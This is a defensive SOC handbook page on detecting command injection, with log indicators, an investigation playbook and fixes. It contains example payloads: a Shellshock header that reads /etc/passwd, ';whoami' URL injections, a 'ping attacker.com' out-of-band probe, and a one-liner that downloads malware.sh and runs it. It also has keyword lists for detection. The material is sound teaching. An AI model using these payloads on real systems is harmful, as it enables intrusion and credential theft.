
# 📘 SOC Analyst Handbook: Detecting Command Injection (CMDi)

**Category:** OS Command Injection / Remote Code Execution (RCE)
**Severity:** Critical
**Skill Level:** Intermediate

---

### 1. The Concept
**Command Injection** is a vulnerability where an application passes unsafe user-supplied data (forms, cookies, HTTP headers) to a system shell.

Think of it like a "Speech-to-Text" system for a server. The server is supposed to take a specific instruction like "Save this file." However, the attacker adds a separator (like a period in a sentence) and adds a new command: *"Save this file. And also, delete the entire hard drive."* Because the application doesn't sanitize the input, the Operating System executes both commands blindly, often with the privileges of the web server.

---

### 2. The Attack Mechanism

#### **How it works**
Developers sometimes use system calls (like `exec()` or `system()`) to let the web app talk to the OS (e.g., using the `cp` command to copy a user's uploaded file).

1.  **Normal Flow:**
    The code expects a filename: `letsdefend.txt`.
    The System executes: `cp letsdefend.txt /tmp` (Copies the file).
2.  **The Exploit:**
    The attacker inputs: `letsdefend.txt; ls`
3.  **The Result:**
    The System executes: `cp letsdefend.txt; ls /tmp`
    *   **`cp ...`**: The copy command runs (or fails).
    *   **`;`**: The semicolon is a "command separator" in Linux. It means "run the previous command, then run the next one."
    *   **`ls`**: The OS lists all files in the directory, potentially revealing sensitive system files to the attacker.

#### **Impact**
If successful, this often leads to **Remote Code Execution (RCE)**. The attacker can:
*   Read system files (`/etc/passwd`).
*   Shut down the server (`shutdown`).
*   Open a "Reverse Shell" (giving them full remote control of the server).

---

### 3. The Detective's Lens (Logs & Patterns)

As a SOC Analyst, you are looking for **System Commands** and **Command Separators** inside web requests (URL, Body, or Headers).

#### **Key Indicators**
*   **Command Separators (The Glue):**
    *   `;` (Linux terminator)
    *   `|` or `||` (Pipe - sends output of one command to another)
    *   `&` or `&&` (And)
    *   `$()` or `` ` `` (Command Substitution)
*   **Common Linux Payload Keywords:**
    *   `cat` (read file), `ls` (list dir), `whoami` (check user), `wget`/`curl` (download malware), `ping` (test connection).
    *   `/etc/passwd` or `/etc/shadow` (Target files).
*   **Common Windows Payload Keywords:**
    *   `dir`, `type`, `ipconfig`, `powershell`, `certutil`.

![cmdi example](../../assets/cmdi1.png)



#### **Example: The "Shellshock" Vulnerability**
Command Injection isn't always in the URL. A famous vulnerability called **Shellshock** exploited the **User-Agent** header.

**Malicious Log Snippet:**
```text
GET / HTTP/1.1
Host: yourcompany.com
User-Agent: () { :;}; echo "NS:" $(</etc/passwd)
```
*   **Analysis:**
    *   **`() { :;};`**: This specific sequence tricked older Bash shells into executing the code that followed it.
    *   **`$(</etc/passwd)`**: This command reads the password file.
    *   **Result:** The server would respond with the contents of the password file in the HTTP headers.

---

### 4. Investigation Steps (The Playbook)

**Step 1: Identify the Input Vector**
*   Where is the weird character?
    *   Is it in the URL? (e.g., `?file=image.jpg;whoami`)
    *   Is it in the Headers? (User-Agent, Referer).

**Step 2: Decode and Translate**
*   Attackers use encoding to bypass WAFs.
*   `%3B` = `;`
*   `%7C` = `|`
*   `%20` = Space
*   **Action:** Decode the payload. If you see a filename followed by a pipe `|` and `wget`, it is definitely an attack.

**Step 3: Analyze the "Response"**
*   **Did it work?**
    *   **Status 200:** If the response body contains the output of the command (e.g., a list of users), the attack was **Successful**.
    *   **Status 500:** The application crashed. The attack might have failed, or the syntax was wrong.
    *   **No Change:** If the page loads normally, the input might have been sanitized.

**Step 4: Check for Out-of-Band Traffic**
*   Smart attackers don't always output data to the screen. They might run: `ping attacker.com`.
*   **Action:** Check your **DNS Logs** or **Firewall Logs**. Did the web server try to initiate a connection to a strange external IP right after the web request?

---

### 5. Remediation & Defense

**Immediate Actions (SOC)**
1.  **Isolate the Server:** If a "Reverse Shell" or `whoami` command was successfully executed, assume the server is compromised. Take it offline.
2.  **Block the IP:** Add the source IP to the blocklist.

**Long-term Fixes (Engineering)**
1.  **Avoid System Calls:** Developers should use built-in language functions (e.g., Python's `shutil.copy()`) instead of passing raw strings to the OS shell.
2.  **Input Validation:** Use strict "Allow-lists." If the input should be a filename, allow *only* `[a-zA-Z0-9.]`. Reject all semicolons, pipes, and dollars.
3.  **Run as Low Privilege:** The web server user (e.g., `www-data`) should never have root/admin access. It should not be able to read sensitive system files.

---

### 🛑 SOC Pro-Tips (Beyond the Basics)

1.  **Blind Command Injection:**
    *   Just like Blind SQLi, the attacker might run `sleep 10` or `ping -c 10 127.0.0.1`.
    *   **Detection:** Look at the **Time Taken** field in your logs. If a simple request took exactly 10 seconds, it's a huge red flag.

2.  **Chaining Commands:**
    *   Attackers often use `&&` (AND).
    *   Payload: `mkdir foo && cd foo && wget malware.sh && bash malware.sh`
    *   This is a "Kill Chain" in a single line. It creates a folder, enters it, downloads a virus, and runs it.

3.  **False Positives:**
    *   The word `cat` or `dir` might appear in legitimate text (e.g., `/products?category=cat-food`).
    *   **Differentiation:** Look for the **Operators** (`|`, `;`, `$`). Without the operators, the keywords are usually harmless.